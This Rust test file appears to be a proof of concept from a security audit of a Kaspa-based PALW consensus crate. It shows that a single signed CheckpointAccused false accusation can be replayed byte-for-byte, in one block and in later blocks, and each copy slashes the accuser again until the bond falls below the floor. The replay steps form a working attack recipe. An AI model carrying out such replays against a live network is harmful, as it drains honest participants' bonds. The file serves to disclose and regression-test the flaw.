#![allow(dead_code, unused_imports)]
//! # MSK-26A-PALW-06 — one-move court false accusations are never marked consumed
//!
//! Title: "One-move court ShardCourtAccused/CheckpointAccused false accusations are never marked
//! consumed, so anyone can re-carry one signed accusation and slash its accuser once per copy."
//!
//! Audit commit: 3d2bd6dc5d77d37396d1b73c4c13526090923b92
//! Crate: kaspa-consensus-core (consensus/core)
//! Command:
//!   cp docs/security/audits/2026-09-claude-pre-freeze/poc/MSK-26A-PALW-06.rs \
//!      consensus/core/tests/audit_poc_msk_26a_palw_06.rs && \
//!   cargo test -p kaspa-consensus-core --test audit_poc_msk_26a_palw_06 -- --nocapture ; \
//!   rm consensus/core/tests/audit_poc_msk_26a_palw_06.rs
//!
//! PASS = the vulnerable behaviour is present: ONE `CheckpointAccused` object (one signature, one
//! session id) that adjudicates `FalseAccusation` against a live, licensed claim is folded again
//! and again — twice in one block and once more in a later block — through testnet-12's own
//! `apply_palw_transition_v7`, and every copy charges the accuser `min(claim.reserved, floor)`
//! again, until the bond drops below the floor. The claim itself is untouched throughout. Once a
//! consumed-accusation guard exists, the second copy is refused and this test FAILS.
//!
//! Setup, all on testnet-12 as shipped (`Params::from(testnet-12)` = `palw_t12_shipped_params()`
//! with the registered models; its bundle's `PalwStateParamsV2`; its genesis fold; the extras the
//! processor's `palw_transition_extras_for` resolves, including `held_context_ladder`,
//! `shard_court_ladder` and `offence_attribution_active` which t12 arms at DAA 0):
//! * t12's genesis 8k held row is made `Active` through the carriage (the one step that is not the
//!   fold, as the repository's own `t12_aheld_held_court.rs` does).
//! * An executor posts a junk attempt on that row whose `execution_root` is the root of a
//!   hand-built, internally authentic binding (a small job of the same class: step tree with the
//!   cache-write rows committed, a per-position checkpoint leg whose chunks hold the same rows).
//!   The panel binds and licenses it all-Valid: the claim is `ReceiptLicensed` (non-terminal).
//! * An accuser bond accuses one K row of checkpoint 0. The row IS the committed row, so the
//!   one-move verdict is `FalseAccusation` (checked directly with `palw_checkpoint_court_verdict_v1`).
//!
//! The accuser's ML-DSA-87 signature is checked only by the acceptance layer
//! (processor.rs `palw_v2_validate_objects`, CheckpointAccused arm) over
//! `palw_checkpoint_court_session_id_v1`, which is a pure function of the object's own fields, so a
//! byte-identical copy carries a signature that verifies identically; this core-level test passes
//! placeholder signature bytes, which the fold never reads.

#[path = "dos_l5_common.rs"]
mod common;
use common::*;

use kaspa_consensus_core::Hash64;
use kaspa_consensus_core::config::params::Params;
use kaspa_consensus_core::mldsa87_primitives::MLDSA87_SIGNATURE_LEN;
use kaspa_consensus_core::palw_attempt_v2::{
    PALW_ATTEMPT_V2_TRACE_CHUNKS, PALW_ATTEMPT_V2_VERSION, PalwAttemptEnvelopeV2, PalwAttemptUnsignedV2, attempt_id_v2,
    attempt_trace_manifest_root_v1, challenge_v2, execution_anchor_v3, execution_commitment_v3,
};
use kaspa_consensus_core::palw_attn_court_v1::{PalwAttnCheckpointAnchorV1, PalwAttnChunkOpeningV1, PalwAttnRowOpeningV1};
use kaspa_consensus_core::palw_checkpoint_court_v1::{
    PALW_CHECKPOINT_COURT_VERSION_V1, PalwCheckpointAccusationV1, PalwCheckpointCourtVerdictV1, palw_checkpoint_court_session_id_v1,
    palw_checkpoint_court_verdict_v1,
};
use kaspa_consensus_core::palw_pwu::palw_pwu_v1;
use kaspa_consensus_core::palw_shard_court_v1::palw_shard_court_false_accusation_charge_v1;
use kaspa_consensus_core::palw_state_chunk_map::{
    PalwStateChunkKindV1, integer_kv_state_chunk_entry_v1, integer_kv_state_locate_v1, palw_map_addresses_history_tiles_v1,
    palw_map_is_held_v4, palw_state_chunk_path_for_map_v1, palw_state_chunks_root_for_map_v1, palw_state_layout_v4,
    tiled_kv_state_geometry_v3,
};
use kaspa_consensus_core::palw_state_v2::{
    PalwBlockWorkV3, PalwBondKeyV2, PalwChainStateV2, PalwClaimPhaseV2, PalwConsensusObjectV2, PalwStateCarriageV2, PalwStateParamsV2,
    PalwStateV2Error, PalwTransitionExtrasV1, apply_palw_transition_v7,
};
use kaspa_consensus_core::palw_step::{PalwStepCoordinateV1, PalwStepNodeRoleV1, PalwStepTableV1, canonical_step_leaf_index, step_leaf_count_capped_v1};
use kaspa_consensus_core::palw_step_leg::{
    PALW_STEP_LEG_OBJECT_VERSION_V1, PalwCheckpointLeafV2, PalwStepBindingV2, PalwStepOpeningV1, PalwStepTileLeafV1,
    binding_commitment_root_v1, checkpoint_genesis_prev_v2, checkpoint_leaf_hash_v2, step_merkle_path_v1, step_merkle_root_v1,
    step_tile_leaf_hash_v1, verify_binding_v1,
};

const EXECUTOR: u64 = 0x0026_A6E0;
const ACCUSER: u64 = 0x0026_A6AC;
/// The small job of the 8k class the hand-built execution runs: 2 prefill positions, 1 decode.
const PREFILL: u32 = 2;

/// The extras the processor resolves (`palw_transition_extras_for`): `dos_l5_common::extras` plus
/// the two court ladders and F2's `palw_offence_attribution`, all read off testnet-12's own fences.
fn court_extras(p: &Params, daa: u64) -> PalwTransitionExtrasV1 {
    let mut e = extras(p, daa);
    let ladder =
        kaspa_consensus_core::palw_court_v2::palw_refutation_leaf_cap_v2(&bundle(p).court, p.palw_court_ladder_active_at(daa));
    e.shard_court_ladder = p.palw_shard_court_active_at(daa).then_some(ladder);
    e.held_context_ladder = p.palw_held_context_active_at(daa).then_some(ladder);
    e.offence_attribution_active = p.palw_offence_attribution_active_at(daa);
    e
}

struct Chain {
    p: Params,
    sp: PalwStateParamsV2,
    s: PalwChainStateV2,
    daa: u64,
}

impl Chain {
    fn fold(&self, objects: &[PalwConsensusObjectV2], work: PalwBlockWorkV3<'_>, key: Hash64) -> Result<PalwChainStateV2, PalwStateV2Error> {
        let daa = self.daa + 1;
        let f = flags(&self.p, daa);
        apply_palw_transition_v7(
            &self.s,
            &self.sp,
            None,
            &ctx(0x26A6_0000 + daa, daa, daa, if matches!(work, PalwBlockWorkV3::Attempt(_)) { T12_BLOCK_SUBSIDY_SOMPI } else { 0 }),
            objects,
            work,
            &[],
            key,
            f.unavailable_abstains,
            f.capability_bound,
            f.uncertified_weightless,
            f.da_court,
            &court_extras(&self.p, daa),
        )
        .map(|(s, _, skips)| {
            assert!(skips.is_empty(), "nothing skipped at {daa}: {skips:?}");
            s
        })
    }

    fn step(&mut self, objects: &[PalwConsensusObjectV2], work: PalwBlockWorkV3<'_>, key: Hash64) -> Result<(), PalwStateV2Error> {
        let next = self.fold(objects, work, key)?;
        self.s = next;
        self.daa += 1;
        Ok(())
    }
}

struct HeldRow {
    id: Hash64,
    profile: kaspa_consensus_core::palw_step::PalwShapeProfileV3,
    job: kaspa_consensus_core::palw_v2::PalwJobContextV2,
    target: u128,
    leaves: u64,
}

/// testnet-12's genesis 8k held row (the answerable one).
fn eight_k(p: &Params) -> HeldRow {
    let rows = genesis_classes(p);
    bundle(p)
        .genesis_objects
        .iter()
        .find_map(|o| match o {
            PalwConsensusObjectV2::ClassRegistered { class_id, admission: Some(c), .. }
                if kaspa_consensus_core::palw_state_chunk_map::palw_profile_is_held_v4(&c.profile) && c.profile.n_ctx == 8_192 =>
            {
                let (_, leaves, target, _) = *rows.iter().find(|r| r.0 == *class_id).expect("a genesis row");
                Some(HeldRow { id: *class_id, profile: c.profile.clone(), job: c.canonical.clone(), target, leaves })
            }
            _ => None,
        })
        .expect("testnet-12 registers the 8k held row")
}

/// The cache row the engine writes at `(kind, layer, position)` — deterministic filler.
fn row(kind: u8, layer: u16, position: u32, lanes: usize) -> Vec<u8> {
    (0..lanes)
        .map(|i| ((kind as i32 * 7919 + layer as i32 * 131 + position as i32 * 17 + i as i32) % 509) - 254)
        .flat_map(|v: i32| v.to_le_bytes())
        .collect()
}

/// A hand-built execution of a small job of `row`'s class, authentic in every commitment the
/// checkpoint court reads, and the accusation of `(K, attn_layer, position 0)` out of checkpoint 0.
/// Returns the binding (its `committed_execution_root` is the root the executor's attempt commits)
/// and a function that builds the accusation for a given claim.
struct Execution {
    binding: PalwStepBindingV2,
    checkpoint_leaves: Vec<PalwCheckpointLeafV2>,
    checkpoint_hashes: Vec<Hash64>,
    chunks0: Vec<Vec<u8>>,
    positions0: u32,
    accused_chunk: u32,
    attn_layer: u16,
    rows: Vec<PalwAttnRowOpeningV1>,
}

fn execution(row_: &HeldRow) -> Execution {
    let profile = row_.profile.clone();
    assert!(palw_map_addresses_history_tiles_v1(&profile), "the 8k held row checkpoints per position");
    let mut job = row_.job.clone();
    job.job_id = h(0x26A6_0001);
    job.job_nullifier = h(0x26A6_0002);
    job.assignment_id = h(0x26A6_0003);
    job.declared_prefill_tokens = PREFILL;
    job.exact_decode_tokens = 1;
    let context_hash = job.context_hash();
    let profile_hash = profile.shape_profile_id();
    assert_eq!(profile_hash, row_.id, "the class id IS the profile's id");
    let count = step_leaf_count_capped_v1(&profile, &job, u64::MAX).expect("the job's leaves");
    println!("  8k row: layers {}, kv_heads {}, head_dim {}, step leaves of the small job {count}", profile.layer_count, profile.attn_kv_heads, profile.attn_head_dim);
    assert!(count < 20_000_000, "the small job's step tree is small enough to build: {count}");
    let mut leaves: Vec<Hash64> = (0..count).map(|i| h(0xF000_0000_0000 + i)).collect();
    let kv_dim = (profile.attn_kv_heads as usize) * (profile.attn_head_dim as usize);

    // The first attention layer and its K-cache writer.
    let attn_layer = (0..profile.layer_count)
        .find(|&l| profile.layer_kind(l) == kaspa_consensus_core::palw_step::PalwLayerKindV1::Attention)
        .expect("an attention layer");
    let (writer_index, writer) =
        profile.attn_nodes.iter().enumerate().find(|(_, n)| n.role == PalwStepNodeRoleV1::KCacheWrite).expect("a K writer");
    let slot = profile.global_node_slot(PalwStepTableV1::Attn, attn_layer, writer_index).expect("a slot");
    let tile = (writer.tile_len as usize).max(1);
    let values = row(0, attn_layer, 0, kv_dim);
    let mut committed_rows: Vec<(u64, PalwStepTileLeafV1)> = Vec::new();
    for (t, lanes) in values.chunks(tile * 4).enumerate() {
        let coord = PalwStepCoordinateV1 { call_index: 0, node_slot: slot, position: 0, tile_index: t as u32 };
        let leaf = PalwStepTileLeafV1 { version: 1, coord, value_count: (lanes.len() / 4) as u32, values_le: lanes.to_vec() };
        let index = canonical_step_leaf_index(&profile, &job, &coord).expect("a committed coordinate");
        leaves[index as usize] = step_tile_leaf_hash_v1(&context_hash, &profile_hash, &leaf);
        committed_rows.push((index, leaf));
    }
    let step_root = step_merkle_root_v1(&leaves).expect("a step root");

    // A per-position checkpoint leg whose chunks hold the same rows.
    let checkpoint_profile = kaspa_consensus_core::palw_state_chunk_map::integer_kv_checkpoint_profile_v1(
        kaspa_consensus_core::palw_state_chunk_map::PALW_INTEGER_KV_CHECKPOINT_INTERVAL_V1,
    );
    let checkpoint_profile_hash = checkpoint_profile.profile_hash();
    let map_id = profile.state_chunk_map_id;
    let checkpoint_count =
        kaspa_consensus_core::palw_context_ladder::palw_checkpoint_count_v1(&profile, &job, checkpoint_profile.checkpoint_interval);
    let mut checkpoint_leaves = Vec::new();
    let mut checkpoint_hashes = Vec::new();
    let mut chunks0 = Vec::new();
    let mut positions0 = 0;
    let mut prev = checkpoint_genesis_prev_v2(&context_hash);
    for c in 0..checkpoint_count {
        let covered = kaspa_consensus_core::palw_context_ladder::palw_checkpoint_covered_at_index_v1(
            &profile,
            c,
            checkpoint_profile.checkpoint_interval,
        )
        .expect("covered");
        let positions = kaspa_consensus_core::palw_context_ladder::palw_checkpoint_positions_at_v1(&profile, &job, covered);
        let (geometry, total) = if palw_map_is_held_v4(&map_id) {
            let layout = palw_state_layout_v4(&profile, positions).expect("a held layout");
            let total = layout.chunk_count();
            (layout.attn, total)
        } else {
            let g = tiled_kv_state_geometry_v3(&profile, positions).expect("a tiled layout");
            let total = g.chunk_count();
            (g, total)
        };
        let mut chunks: Vec<Vec<u8>> = (0..geometry.chunk_count())
            .map(|i| {
                let entry = integer_kv_state_chunk_entry_v1(&geometry, i).expect("an entry");
                let kind = match entry.kind {
                    PalwStateChunkKindV1::Key => 0u8,
                    PalwStateChunkKindV1::Value => 1u8,
                };
                (entry.position_start..entry.position_start + entry.position_count)
                    .flat_map(|p| row(kind, entry.attn_layer, p, entry.row_bytes as usize / 4))
                    .collect()
            })
            .collect();
        // A hybrid's recurrence chunks (none on a dense row) — filler bytes.
        for i in geometry.chunk_count()..total {
            chunks.push(vec![(i & 0xFF) as u8; 8]);
        }
        let root = palw_state_chunks_root_for_map_v1(&profile, positions, &chunks).expect("a state root");
        let leaf = PalwCheckpointLeafV2 {
            version: 1,
            checkpoint_index: c,
            covered_decode_call: covered,
            prev_checkpoint_leaf_hash: prev,
            state_chunk_count: chunks.len() as u32,
            state_chunks_root: root,
        };
        let hash = checkpoint_leaf_hash_v2(&context_hash, &checkpoint_profile_hash, &map_id, &leaf);
        prev = hash;
        if c == 0 {
            chunks0 = chunks;
            positions0 = positions;
        }
        checkpoint_leaves.push(leaf);
        checkpoint_hashes.push(hash);
    }
    let checkpoint_root = step_merkle_root_v1(&checkpoint_hashes).expect("a checkpoint root");
    let mut binding = PalwStepBindingV2 {
        version: PALW_STEP_LEG_OBJECT_VERSION_V1,
        step_leaf_count: count,
        job_context: job,
        checkpoint_profile,
        state_chunk_map_id: map_id,
        shape_profile: profile.clone(),
        full_logits_trace_root: h(0x26A6_0AAA),
        activation_leg_root: h(0x26A6_0BBB),
        step_merkle_root: step_root,
        checkpoint_count,
        checkpoint_merkle_root: checkpoint_root,
        committed_execution_root: Hash64::default(),
    };
    binding.committed_execution_root = binding_commitment_root_v1(&binding);
    verify_binding_v1(&binding).expect("the hand-built binding authenticates");

    let geometry0 = if palw_map_is_held_v4(&map_id) {
        palw_state_layout_v4(&profile, positions0).expect("layout").attn
    } else {
        tiled_kv_state_geometry_v3(&profile, positions0).expect("layout")
    };
    let (accused_chunk, _) = integer_kv_state_locate_v1(&geometry0, PalwStateChunkKindV1::Key, attn_layer, 0).expect("a chunk");
    let rows = committed_rows
        .into_iter()
        .map(|(index, leaf)| PalwAttnRowOpeningV1 {
            leaf,
            opening: PalwStepOpeningV1 {
                leaf_index: index,
                leaf_hash: leaves[index as usize],
                siblings: step_merkle_path_v1(&leaves, index as usize).expect("a path"),
            },
        })
        .collect();
    Execution {
        binding,
        checkpoint_leaves,
        checkpoint_hashes,
        chunks0,
        positions0,
        accused_chunk: accused_chunk as u32,
        attn_layer,
        rows,
    }
}

impl Execution {
    fn accusation(&self, claim_id: Hash64, claim: &kaspa_consensus_core::palw_state_v2::PalwClaimStateV2, accuser: PalwBondKeyV2) -> PalwCheckpointAccusationV1 {
        let profile = &self.binding.shape_profile;
        PalwCheckpointAccusationV1 {
            version: PALW_CHECKPOINT_COURT_VERSION_V1,
            claim: claim_id,
            execution_root: claim.execution_root,
            trace_root: claim.trace_root,
            executor_bond: claim.bond,
            accuser_bond: accuser,
            binding: self.binding.clone(),
            anchor: PalwAttnCheckpointAnchorV1 {
                leaf: self.checkpoint_leaves[0].clone(),
                opening: PalwStepOpeningV1 {
                    leaf_index: 0,
                    leaf_hash: self.checkpoint_hashes[0],
                    siblings: step_merkle_path_v1(&self.checkpoint_hashes, 0).expect("a checkpoint path"),
                },
            },
            chunk: PalwAttnChunkOpeningV1 {
                chunk_index: self.accused_chunk,
                chunk_bytes: self.chunks0[self.accused_chunk as usize].clone(),
                siblings: palw_state_chunk_path_for_map_v1(profile, self.positions0, &self.chunks0, self.accused_chunk)
                    .expect("a chunk path"),
            },
            kind: 0,
            attn_layer: self.attn_layer,
            position: 0,
            rows: self.rows.clone(),
            // Checked by the acceptance layer over the session id, never read by the fold.
            signature: vec![0xA5; MLDSA87_SIGNATURE_LEN],
        }
    }
}

/// `dos_l5_common::junk_attempt` with the execution root the executor actually committed.
fn attempt_committing(
    class_id: Hash64,
    bond: PalwBondKeyV2,
    pwu: u64,
    seed: u64,
    pre_pow: u64,
    execution_root: Hash64,
) -> (PalwAttemptEnvelopeV2, Hash64, Hash64) {
    let nonce = 7u64;
    let ts = 1_700_000_000u64 + seed;
    let attempt = PalwAttemptUnsignedV2 {
        version: PALW_ATTEMPT_V2_VERSION,
        network_domain: h(NET),
        challenge: challenge_v2(h(NET), h(pre_pow), ts, nonce, class_id, &bond.0),
        class_id,
        executor_bond: bond.0,
        executor_pubkey: pubkey_of(EXECUTOR),
        operator_id: kaspa_consensus_core::palw_state_v2::palw_operator_id_v2(&operator_pubkey_of(EXECUTOR)),
        artifact_root: h(0xA27),
        trace_root: h(0x1701_0000_0000 ^ seed),
        output_root: h(0x1702_0000_0000 ^ seed),
        pwu,
        trace_manifest_root: attempt_trace_manifest_root_v1(h(0x1701_0000_0000 ^ seed), PALW_ATTEMPT_V2_TRACE_CHUNKS),
        trace_chunk_count: PALW_ATTEMPT_V2_TRACE_CHUNKS,
        trace_retention_daa: 999_999,
        execution_root,
    };
    let env = PalwAttemptEnvelopeV2 { attempt, signature: vec![0u8; MLDSA87_SIGNATURE_LEN] };
    let anchor = execution_anchor_v3(h(NET), h(pre_pow), class_id, &bond.0, nonce);
    let key = execution_commitment_v3(&env.attempt, anchor);
    let id = attempt_id_v2(&env.attempt);
    (env, key, id)
}

#[test]
fn msk_26a_palw_06_one_false_checkpoint_accusation_is_charged_once_per_copy_on_testnet_12() {
    let p = t12();
    // The fences the claim depends on, as testnet-12 ships them.
    assert!(p.palw_held_context_active_at(1_000), "t12 arms the held regime (CheckpointAccused) at genesis");
    assert!(p.palw_shard_court_active_at(1_000), "t12 arms the one-move court (ShardCourtAccused) at genesis");
    assert!(p.palw_offence_attribution_active_at(1_000), "t12 arms palw_offence_attribution at genesis");
    let b = bundle(&p);
    let sp = b.state.clone();
    let row_ = eight_k(&p);
    let seats: Vec<(PalwBondKeyV2, Hash64)> =
        genesis_bonds(&p)[..b.panel.seat_count() as usize].iter().map(|(k, o, _)| (*k, *o)).collect();

    // Genesis, with the 8k row Active (as t12_aheld_held_court.rs does).
    let mut s = genesis_state(&p);
    let mut c = PalwStateCarriageV2::from_state(&s);
    c.model_lifecycles.get_mut(&row_.id).expect("the row").state =
        kaspa_consensus_core::palw_model_registry_v1::PalwModelLifecycleV1::Active;
    s = c.into_state_v3(&sp, None, flags(&p, 0).uncertified_weightless, p.palw_canonical_work_daa()).expect("a consistent carriage");
    let mut chain = Chain { p: p.clone(), sp: sp.clone(), s, daa: 999 };

    let floor = sp.min_collateral_sompi();
    let exec = execution(&row_);

    // DAA 1000: the executor and a generously bonded placeholder; the accuser is bonded once the
    // charge is known (below), at floor + 3 x charge.
    chain
        .step(&[bond_obj(EXECUTOR, 1_000_000_000_000_000)], PalwBlockWorkV3::None, Hash64::default())
        .expect("the executor bonds");

    // The executor's attempt commits the hand-built execution's root; the panel binds and licenses.
    let pwu = match chain.s.palw_canonical_per_draw_v1(&row_.id, chain.daa + 1, p.palw_canonical_work_daa()) {
        Some(work) => kaspa_consensus_core::palw_admission_v2::palw_attempt_derived_pwu_v1(row_.target, work),
        None => palw_pwu_v1(row_.target, row_.leaves),
    };
    let (env, key, claim_id) =
        attempt_committing(row_.id, bond_key(EXECUTOR), pwu, 0x26A6, 0x26A6_0000, exec.binding.committed_execution_root);
    chain.step(&[], PalwBlockWorkV3::Attempt(&env), key).expect("the attempt folds");
    let claim = chain.s.claim(&claim_id).expect("the claim is recorded").clone();
    assert_eq!(claim.execution_root, exec.binding.committed_execution_root);
    chain
        .step(
            &[PalwConsensusObjectV2::PanelBound { claim: claim_id, anchor: h(0x26A6_0A00), seats: seats_of(&seats) }],
            PalwBlockWorkV3::None,
            Hash64::default(),
        )
        .expect("the panel binds");
    let keys: Vec<PalwBondKeyV2> = seats.iter().map(|s| s.0).collect();
    chain
        .step(
            &[PalwConsensusObjectV2::ReceiptLicensed { claim: claim_id, receipts: valid_receipts(claim_id, &keys) }],
            PalwBlockWorkV3::None,
            Hash64::default(),
        )
        .expect("the panel licenses");
    let claim = chain.s.claim(&claim_id).unwrap().clone();
    assert!(matches!(claim.phase, PalwClaimPhaseV2::ReceiptLicensed { .. }), "licensed: {:?}", claim.phase);

    let charge = palw_shard_court_false_accusation_charge_v1(claim.reserved, floor) as u64;
    assert!(charge > 0, "a false accusation costs something");
    let accuser = bond_key(ACCUSER);
    let collateral0 = floor + 3 * charge;
    chain.step(&[bond_obj(ACCUSER, collateral0)], PalwBlockWorkV3::None, Hash64::default()).expect("the accuser bonds");
    println!(
        "  floor {floor} sompi, claim.reserved {}, designed charge min(reserved, floor) = {charge}; accuser collateral {collateral0}",
        claim.reserved
    );

    // The one accusation, and its verdict at the court's own ladder.
    let a = exec.accusation(claim_id, &claim, accuser);
    let ladder = court_extras(&p, chain.daa + 1).held_context_ladder.expect("held regime armed");
    let ladder = chain.s.class_step_ladder_v1(&claim.class_id, ladder);
    assert_eq!(
        palw_checkpoint_court_verdict_v1(&a, claim.class_id, ladder),
        Ok(PalwCheckpointCourtVerdictV1::FalseAccusation),
        "the accused row IS the committed row: a false accusation"
    );
    let domain = kaspa_consensus_core::palw_attempt_v2::palw_network_domain_v2_for(b"testnet-12", None);
    let session = palw_checkpoint_court_session_id_v1(domain.as_byte_slice(), &a);
    let object = PalwConsensusObjectV2::CheckpointAccused { accusation: Box::new(a) };
    let executor_collateral = |s: &PalwChainStateV2| s.bond(&bond_key(EXECUTOR)).unwrap().collateral;
    let collateral = |s: &PalwChainStateV2| s.bond(&accuser).unwrap().collateral;
    let exec_before = executor_collateral(&chain.s);

    // Block 1: the accuser's own filing — the designed, once-only charge.
    chain.step(std::slice::from_ref(&object), PalwBlockWorkV3::None, Hash64::default()).expect("the filing folds");
    let after_filing = collateral(&chain.s);
    println!("  DAA {}: own filing folded, accuser collateral {collateral0} -> {after_filing}", chain.daa);
    assert_eq!(after_filing, collateral0 - charge, "the filing charges min(reserved, floor) once");
    assert!(matches!(chain.s.claim(&claim_id).unwrap().phase, PalwClaimPhaseV2::ReceiptLicensed { .. }), "the claim stands");

    // Block 2: a third party re-carries the SAME object bytes twice in one block. Same signature,
    // same session id — both copies fold, and each charges again.
    let copies = [object.clone(), object.clone()];
    assert!(copies.iter().all(|o| o == &object), "byte-identical copies");
    chain.step(&copies, PalwBlockWorkV3::None, Hash64::default()).expect("two replayed copies fold in one block");
    let after_block2 = collateral(&chain.s);
    println!("  DAA {}: two replayed copies folded, accuser collateral {after_filing} -> {after_block2}", chain.daa);
    assert_eq!(after_block2, collateral0 - 3 * charge, "BUG: each replayed copy is charged again");

    // Block 3: one more copy in a later block.
    chain.step(std::slice::from_ref(&object), PalwBlockWorkV3::None, Hash64::default()).expect("a later replay folds");
    let after_block3 = collateral(&chain.s);
    println!("  DAA {}: one more replayed copy folded, accuser collateral {after_block2} -> {after_block3}", chain.daa);
    assert_eq!(after_block3, collateral0 - 4 * charge, "BUG: a replay in a later block is charged again");
    assert!(after_block3 < floor, "the replays pushed the bond below the floor");

    // Only the floor stops it: the next copy is refused as BondBelowFloor, not as a duplicate.
    let refused = chain.fold(std::slice::from_ref(&object), PalwBlockWorkV3::None, Hash64::default());
    println!("  DAA {}: next copy -> {:?}", chain.daa + 1, refused.as_ref().err());
    assert!(
        matches!(refused, Err(PalwStateV2Error::BondBelowFloor { .. })),
        "the fifth copy is stopped only by the floor, got {refused:?}"
    );

    // The honest claim was never touched, and the executor lost nothing.
    assert!(matches!(chain.s.claim(&claim_id).unwrap().phase, PalwClaimPhaseV2::ReceiptLicensed { .. }), "the claim stands");
    assert_eq!(executor_collateral(&chain.s), exec_before, "the executor is untouched");
    let slashed = chain.s.bond(&accuser).unwrap().slashed;
    println!(
        "  session id {session} (one signature): accuser slashed {slashed} sompi over 4 folds = {}x the designed charge {charge}",
        slashed / charge
    );
    assert_eq!(slashed, 4 * charge, "BUG: one false accusation cost its accuser 4 x min(reserved, floor)");
}
